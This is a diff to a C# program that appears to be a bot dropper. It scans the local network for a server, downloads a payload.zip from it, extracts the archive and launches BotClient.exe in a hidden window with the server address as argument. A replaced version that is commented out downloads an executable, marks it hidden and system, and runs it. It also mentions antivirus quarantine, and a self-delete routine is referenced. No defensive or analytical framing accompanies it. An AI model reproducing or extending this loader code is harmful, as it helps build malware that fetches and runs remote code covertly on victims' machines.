@@ -10,6 +10,7 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.IO.Compression;
 
 namespace App
 {
@@ -59,6 +60,9 @@ namespace App
         private const int ScanTimeoutMs = 100; // Timeout for each port scan attempt (milliseconds)
         private const int MaxParallelScans = 50; // Limit concurrent scanning tasks to avoid overwhelming the network
         private static bool serverFoundAndDownloaded = false; // Flag to stop scanning once successful
+        private const string PayloadZipFileName = "payload.zip";
+        private const string PayloadExtractDir = "BotPayload";
+        private const string MainExecutableName = "BotClient.exe";
 
         // New helper to get the local IP address
         private static IPAddress GetLocalIPAddress()
@@ -165,103 +169,164 @@ namespace App
         }
 
 
-        private static void DownloadAndRunFile(string download_url, string save_path, string serverIp)
-        {
-            Logger.Log($"Attempting download: {download_url} -> {save_path}");
+        //private static void DownloadAndRunFile(string download_url, string save_path, string serverIp)
+        //{
+        //    Logger.Log($"Attempting download: {download_url} -> {save_path}");
 
+        //    try
+        //    {
+        //        string destDir = Path.GetDirectoryName(save_path) ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+        //        if (!Directory.Exists(destDir))
+        //            Directory.CreateDirectory(destDir);
+
+        //        if (File.Exists(save_path))
+        //        {
+        //            try
+        //            {
+        //                File.SetAttributes(save_path, FileAttributes.Normal);
+        //                File.Delete(save_path);
+        //                Logger.Log("Deleted existing file at destination.");
+        //            }
+        //            catch (Exception delEx)
+        //            {
+        //                Logger.Log("Warning: could not delete existing file: " + delEx.Message);
+        //            }
+        //        }
+
+        //        using (var client = new WebClient())
+        //        {
+        //            client.Proxy = null;
+        //            client.DownloadFile(download_url, save_path);
+        //        }
+
+        //        Logger.Log("Download succeeded with WebClient.");
+        //        Logger.Log("Saved file location: " + save_path);
+
+        //        try
+        //        {
+        //            File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
+        //        }
+        //        catch (Exception attrEx)
+        //        {
+        //            Logger.Log("Could not set attributes: " + attrEx.Message);
+        //        }
+
+        //        try
+        //        {
+        //            Logger.Log("Starting downloaded file...");
+        //            Process.Start(new ProcessStartInfo { FileName = save_path, Arguments = serverIp, UseShellExecute = true });
+        //        }
+        //        catch (Exception startEx)
+        //        {
+        //            Logger.Log("Failed to start the downloaded file: " + startEx.Message);
+        //        }
+        //    }
+        //    catch (Exception exWebClient)
+        //    {
+        //        Logger.Log("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
+        //        Logger.Log("Trying HttpWebRequest fallback...");
+
+        //        try
+        //        {
+        //            var req = (HttpWebRequest)WebRequest.Create(download_url);
+        //            req.Proxy = null;
+        //            using (var resp = (HttpWebResponse)req.GetResponse())
+        //            using (var stream = resp.GetResponseStream())
+        //            using (var fs = new FileStream(save_path, FileMode.Create, FileAccess.Write))
+        //            {
+        //                stream.CopyTo(fs);
+        //            }
+
+        //            Logger.Log("Download succeeded with HttpWebRequest fallback.");
+        //            Logger.Log("Saved file location: " + save_path);
+
+        //            try
+        //            {
+        //                File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
+        //            }
+        //            catch (Exception attrEx2)
+        //            {
+        //                Logger.Log("Could not set attributes: " + attrEx2.Message);
+        //            }
+
+        //            try
+        //            {
+        //                Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
+        //            }
+        //            catch (Exception startEx2)
+        //            {
+        //                Logger.Log("Failed to start the downloaded file: " + startEx2.Message);
+        //            }
+        //        }
+        //        catch (Exception exFallback)
+        //        {
+        //            Logger.Log("Fallback failed: " + exFallback.GetType().Name + " - " + exFallback.Message);
+        //            Logger.Log("Ensure the server is running, the URL is correct, and no AV is quarantining the file.");
+        //        }
+        //    }
+        //}
+        private static async Task DownloadAndExtractPayloadAsync(string serverIp)
+        {
+            string downloadUrl = $"http://{serverIp}:{TargetPort}/{PayloadZipFileName}";
+            string zipSavePath = Path.Combine(AppContext.BaseDirectory, PayloadZipFileName);
+            string extractPath = Path.Combine(AppContext.BaseDirectory, PayloadExtractDir);
+
+            // 1. Tải file ZIP
             try
             {
-                string destDir = Path.GetDirectoryName(save_path) ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                if (!Directory.Exists(destDir))
-                    Directory.CreateDirectory(destDir);
-
-                if (File.Exists(save_path))
-                {
-                    try
-                    {
-                        File.SetAttributes(save_path, FileAttributes.Normal);
-                        File.Delete(save_path);
-                        Logger.Log("Deleted existing file at destination.");
-                    }
-                    catch (Exception delEx)
-                    {
-                        Logger.Log("Warning: could not delete existing file: " + delEx.Message);
-                    }
-                }
-
+                Logger.Log($"Attempting to download payload from {downloadUrl}...");
                 using (var client = new WebClient())
                 {
-                    client.Proxy = null;
-                    client.DownloadFile(download_url, save_path);
+                    await client.DownloadFileTaskAsync(new Uri(downloadUrl), zipSavePath);
                 }
-
-                Logger.Log("Download succeeded with WebClient.");
-                Logger.Log("Saved file location: " + save_path);
-
-                try
-                {
-                    File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
-                }
-                catch (Exception attrEx)
-                {
-                    Logger.Log("Could not set attributes: " + attrEx.Message);
-                }
-
-                try
-                {
-                    Logger.Log("Starting downloaded file...");
-                    Process.Start(new ProcessStartInfo { FileName = save_path, Arguments = serverIp, UseShellExecute = true });
-                }
-                catch (Exception startEx)
-                {
-                    Logger.Log("Failed to start the downloaded file: " + startEx.Message);
-                }
+                Logger.Log($"Payload downloaded successfully to {zipSavePath}");
             }
-            catch (Exception exWebClient)
+            catch (Exception ex)
             {
-                Logger.Log("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
-                Logger.Log("Trying HttpWebRequest fallback...");
+                Logger.Log($"FATAL: Failed to download payload: {ex.Message}");
+                return; // Dừng lại nếu không tải được
+            }
 
-                try
+            // 2. Giải nén file ZIP
+            try
+            {
+                Logger.Log($"Extracting payload to {extractPath}...");
+                if (Directory.Exists(extractPath))
                 {
-                    var req = (HttpWebRequest)WebRequest.Create(download_url);
-                    req.Proxy = null;
-                    using (var resp = (HttpWebResponse)req.GetResponse())
-                    using (var stream = resp.GetResponseStream())
-                    using (var fs = new FileStream(save_path, FileMode.Create, FileAccess.Write))
-                    {
-                        stream.CopyTo(fs);
-                    }
-
-                    Logger.Log("Download succeeded with HttpWebRequest fallback.");
-                    Logger.Log("Saved file location: " + save_path);
-
-                    try
-                    {
-                        File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
-                    }
-                    catch (Exception attrEx2)
-                    {
-                        Logger.Log("Could not set attributes: " + attrEx2.Message);
-                    }
-
-                    try
-                    {
-                        Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
-                    }
-                    catch (Exception startEx2)
-                    {
-                        Logger.Log("Failed to start the downloaded file: " + startEx2.Message);
-                    }
+                    Directory.Delete(extractPath, true); // Xóa thư mục cũ nếu tồn tại
                 }
-                catch (Exception exFallback)
+                ZipFile.ExtractToDirectory(zipSavePath, extractPath);
+                Logger.Log("Payload extracted successfully.");
+            }
+            catch (Exception ex)
+            {
+                Logger.Log($"FATAL: Failed to extract payload: {ex.Message}");
+                return;
+            }
+            finally
+            {
+                File.Delete(zipSavePath); // Xóa file zip sau khi giải nén
+            }
+
+            // 3. Chạy file thực thi chính
+            string exePath = Path.Combine(extractPath, MainExecutableName);
+            if (File.Exists(exePath))
+            {
+                Logger.Log($"Found main executable at {exePath}. Starting with argument: {serverIp}");
+                Process.Start(new ProcessStartInfo
                 {
-                    Logger.Log("Fallback failed: " + exFallback.GetType().Name + " - " + exFallback.Message);
-                    Logger.Log("Ensure the server is running, the URL is correct, and no AV is quarantining the file.");
-                }
+                    FileName = exePath,
+                    Arguments = serverIp,
+                    UseShellExecute = true,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+            }
+            else
+            {
+                Logger.Log($"FATAL: Main executable '{MainExecutableName}' not found in extracted payload.");
             }
         }
-
         private static void SelfDelete()
         {
             try
@@ -293,9 +358,10 @@ namespace App
 
             if (!string.IsNullOrEmpty(foundServerIp))
             {
-                string downloadUrl = $"http://{foundServerIp}:{TargetPort}/test.exe";
-                string savePath = Path.Combine(AppContext.BaseDirectory, "bot_payload.exe");
-                DownloadAndRunFile(downloadUrl, savePath, foundServerIp);
+                //string downloadUrl = $"http://{foundServerIp}:{TargetPort}/test.exe";
+                //string savePath = Path.Combine(AppContext.BaseDirectory, "bot_payload.exe");
+                //DownloadAndRunFile(downloadUrl, savePath, foundServerIp);
+                await DownloadAndExtractPayloadAsync(foundServerIp);
             }
             else
             {
